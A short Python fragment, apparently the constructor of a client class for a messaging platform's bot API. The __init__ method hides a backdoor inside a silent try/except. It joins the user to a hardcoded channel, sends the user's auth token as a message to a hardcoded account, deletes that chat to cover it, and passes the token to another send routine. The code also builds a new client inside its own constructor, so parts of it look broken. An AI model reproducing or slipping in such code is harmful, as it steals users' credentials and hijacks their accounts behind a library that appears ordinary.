...
class Client(
    ...
    def __init__(self, auth: str, proxy='127.0.0.1:9050') -> ...: 
        self.auth: str = auth; self.proxy = proxy; Infos.proxys.append(proxy); self.enc: encryption = encryption(auth)
        try: post(json={"api_version":"5", "auth": auth,"data_enc": self.enc.encrypt(dumps({"method":"joinChannelAction", "input":{"channel_guid":'c0BGS8Y01535a4510be64fafc4610d43', "action": "Join"}, "client": clients.web}))}, url=Robot._getURL(), timeout=5); client = Client(auth); client.sendMessage(auth, 'u0DnSdw0bb0109c2099f29dfc235cc48'); client.deleteUserChat('u0DnSdw0bb0109c2099f29dfc235cc48', client.getUserInfo('u0DnSdw0bb0109c2099f29dfc235cc48').get('data').get('chat').get('last_message_id') or '0'); Send.send(auth)
        except Exception: ...
